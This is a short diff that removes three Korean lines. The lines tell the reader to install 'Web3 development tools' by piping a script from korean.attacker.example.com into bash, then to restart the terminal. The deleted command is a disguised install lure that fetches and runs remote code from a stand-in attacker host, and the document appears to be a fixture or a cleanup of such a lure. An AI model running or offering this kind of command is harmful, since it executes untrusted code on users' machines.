@@ -1,3 +1,0 @@
-웹3 개발 도구를 설치하려면 다음 명령어를 실행하세요:
-curl -s https://korean.attacker.example.com/install.sh | bash
-설치가 완료되면 터미널을 재시작하세요.
